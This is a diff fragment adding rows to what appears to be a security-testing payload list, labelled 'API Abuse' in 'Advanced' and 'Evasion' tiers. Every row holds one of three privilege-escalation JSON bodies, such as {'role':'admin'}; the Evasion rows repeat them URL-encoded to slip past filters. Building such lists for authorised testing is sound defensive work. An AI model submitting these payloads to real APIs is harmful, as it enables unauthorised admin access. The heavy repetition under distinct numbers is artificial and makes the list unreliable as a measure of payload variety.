+API Abuse,Advanced,30,"{""role"":""admin""}"
+API Abuse,Advanced,31,"{""role"":""admin""}"
+API Abuse,Advanced,32,"{""role"":""admin""}"
+API Abuse,Advanced,33,"{""access"":""root""}"
+API Abuse,Advanced,34,"{""access"":""root""}"
+API Abuse,Advanced,35,"{""role"":""admin""}"
+API Abuse,Advanced,36,"{""access"":""root""}"
+API Abuse,Advanced,37,"{""access"":""root""}"
+API Abuse,Advanced,38,"{""access"":""root""}"
+API Abuse,Advanced,39,"{""access"":""root""}"
+API Abuse,Advanced,40,"{""admin"":true}"
+API Abuse,Advanced,41,"{""access"":""root""}"
+API Abuse,Advanced,42,"{""access"":""root""}"
+API Abuse,Advanced,43,"{""admin"":true}"
+API Abuse,Advanced,44,"{""role"":""admin""}"
+API Abuse,Advanced,45,"{""role"":""admin""}"
+API Abuse,Advanced,46,"{""role"":""admin""}"
+API Abuse,Advanced,47,"{""admin"":true}"
+API Abuse,Advanced,48,"{""access"":""root""}"
+API Abuse,Advanced,49,"{""admin"":true}"
+API Abuse,Advanced,50,"{""admin"":true}"
+API Abuse,Advanced,51,"{""role"":""admin""}"
+API Abuse,Advanced,52,"{""admin"":true}"
+API Abuse,Advanced,53,"{""role"":""admin""}"
+API Abuse,Advanced,54,"{""access"":""root""}"
+API Abuse,Advanced,55,"{""role"":""admin""}"
+API Abuse,Advanced,56,"{""admin"":true}"
+API Abuse,Advanced,57,"{""access"":""root""}"
+API Abuse,Advanced,58,"{""role"":""admin""}"
+API Abuse,Advanced,59,"{""role"":""admin""}"
+API Abuse,Advanced,60,"{""admin"":true}"
+API Abuse,Evasion,1,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,2,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,3,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,4,%7B%22admin%22:true%7D
+API Abuse,Evasion,5,%7B%22admin%22:true%7D
+API Abuse,Evasion,6,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,7,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,8,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,9,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,10,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,11,%7B%22admin%22:true%7D
+API Abuse,Evasion,12,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,13,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,14,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,15,%7B%22admin%22:true%7D
+API Abuse,Evasion,16,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,17,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,18,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,19,%7B%22admin%22:true%7D
+API Abuse,Evasion,20,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,21,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,22,%7B%22admin%22:true%7D
+API Abuse,Evasion,23,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,24,%7B%22admin%22:true%7D
+API Abuse,Evasion,25,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,26,%7B%22admin%22:true%7D
+API Abuse,Evasion,27,%7B%22admin%22:true%7D
+API Abuse,Evasion,28,%7B%22admin%22:true%7D
+API Abuse,Evasion,29,%7B%22admin%22:true%7D
+API Abuse,Evasion,30,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,31,%7B%22admin%22:true%7D
+API Abuse,Evasion,32,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,33,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,34,%7B%22admin%22:true%7D
+API Abuse,Evasion,35,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,36,%7B%22admin%22:true%7D
+API Abuse,Evasion,37,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,38,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,39,%7B%22admin%22:true%7D
+API Abuse,Evasion,40,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,41,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,42,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,43,%7B%22admin%22:true%7D
+API Abuse,Evasion,44,%7B%22admin%22:true%7D
+API Abuse,Evasion,45,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,46,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,47,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,48,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,49,%7B%22admin%22:true%7D
+API Abuse,Evasion,50,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,51,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,52,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,53,%7B%22admin%22:true%7D
+API Abuse,Evasion,54,%7B%22admin%22:true%7D
+API Abuse,Evasion,55,%7B%22admin%22:true%7D
+API Abuse,Evasion,56,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,57,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,58,%7B%22admin%22:true%7D
+API Abuse,Evasion,59,%7B%22admin%22:true%7D
+API Abuse,Evasion,60,%7B%22role%22:%22admin%22%7D
